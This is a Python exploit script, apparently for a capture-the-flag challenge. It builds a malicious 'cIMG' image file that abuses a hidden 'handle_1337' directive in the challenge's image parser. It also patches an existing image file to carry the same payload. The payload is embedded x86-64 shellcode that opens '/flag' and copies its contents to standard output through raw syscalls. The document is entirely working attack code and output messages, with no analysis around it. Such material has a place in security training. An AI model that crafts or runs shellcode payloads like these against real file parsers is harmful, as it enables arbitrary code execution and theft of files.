#!/usr/bin/env python3

import struct

def create_working_exploit():
    """Create a working exploit based on the existing CIMG.cimg structure"""
    
    # Our shellcode (50 bytes)
    shellcode = bytes([
        0xbb, 0x66, 0x6c, 0x61, 0x67, 0x48, 0xc1, 0xe3, 
        0x08, 0xb3, 0x2f, 0x53, 0xb0, 0x02, 0x48, 0x89,
        0xe7, 0x48, 0x31, 0xf6, 0x0f, 0x05, 0x48, 0x31, 
        0xff, 0x48, 0xff, 0xc7, 0x48, 0x89, 0xc6, 0x48,
        0x31, 0xd2, 0x4d, 0x31, 0xd2, 0x66, 0x41, 0xba, 
        0xe8, 0x03, 0xb0, 0x28, 0x0f, 0x05, 0xb0, 0x3c,
        0x0f, 0x05
    ])
    
    # Start with the exact same header as CIMG.cimg
    cimg_data = b"cIMG"  # Magic
    cimg_data += struct.pack("<H", 4)  # Version 4
    cimg_data += struct.pack("<BB", 0x14, 0x34)  # Width=20, Height=52 (same as original)
    
    # Directive 2: This seems to be what the original does first
    cimg_data += struct.pack("<H", 2)  # Directive code 2
    cimg_data += struct.pack("<BBBB", 0, 0, 1, 0)  # Parameters for directive 2
    
    # Fill with A's to match the original structure (up to the shellcode location)
    # The original has A's from offset 0x10 to 0x1000, then some 0xff bytes
    padding_size = 0x1000 - len(cimg_data)
    cimg_data += b"A" * padding_size
    
    # Add the delimiter bytes like in the original
    cimg_data += b"\xff" * 8
    
    # Add our shellcode at the same location as the original
    cimg_data += shellcode
    
    # Pad to the directive location (0x1040 in original)
    current_size = len(cimg_data)
    directive_offset = 0x1040
    if current_size < directive_offset:
        cimg_data += b"\x00" * (directive_offset - current_size)
    
    # Add the handle_1337 directive (0x539)
    cimg_data += struct.pack("<H", 0x539)  # Directive code 1337
    cimg_data += struct.pack("<BBBBB", 
        0,    # sprite_id = 0
        0,    # offset_x = 0
        0,    # offset_y = 0  
        20,   # width = 20 (extract full width)
        52    # height = 52 (extract full height)
    )
    
    # Add terminating directive
    cimg_data += struct.pack("<H", 0)  # End directive
    
    return cimg_data

def main():
    print("[*] Creating working exploit based on original CIMG structure...")
    exploit_data = create_working_exploit()
    
    with open("exploit.cimg", "wb") as f:
        f.write(exploit_data)
    
    print(f"[*] Created exploit.cimg ({len(exploit_data)} bytes)")
    print("[*] To test: ./challenge/integration-cimg-screenshot-sc exploit.cimg")
    
    # Also test with a direct shellcode injection
    print("\n[*] Creating direct shellcode injection...")
    
    # Read the original CIMG.cimg and modify it
    with open("CIMG.cimg", "rb") as f:
        original_data = f.read()
    
    # Find the shellcode location and replace it with a ROP chain or direct execution
    # The shellcode starts at offset 0x1008
    shellcode_offset = 0x1008
    
    # Create modified version with our shellcode
    modified_data = original_data[:shellcode_offset]
    
    # Add our shellcode
    shellcode = bytes([
        0xbb, 0x66, 0x6c, 0x61, 0x67, 0x48, 0xc1, 0xe3, 
        0x08, 0xb3, 0x2f, 0x53, 0xb0, 0x02, 0x48, 0x89,
        0xe7, 0x48, 0x31, 0xf6, 0x0f, 0x05, 0x48, 0x31, 
        0xff, 0x48, 0xff, 0xc7, 0x48, 0x89, 0xc6, 0x48,
        0x31, 0xd2, 0x4d, 0x31, 0xd2, 0x66, 0x41, 0xba, 
        0xe8, 0x03, 0xb0, 0x28, 0x0f, 0x05, 0xb0, 0x3c,
        0x0f, 0x05
    ])
    modified_data += shellcode
    
    # Add the rest of the original data after our shellcode
    rest_offset = shellcode_offset + len(shellcode)
    if rest_offset < len(original_data):
        modified_data += original_data[rest_offset:]
    
    with open("modified.cimg", "wb") as f:
        f.write(modified_data)
    
    print(f"[*] Created modified.cimg ({len(modified_data)} bytes)")

if __name__ == "__main__":
    main()
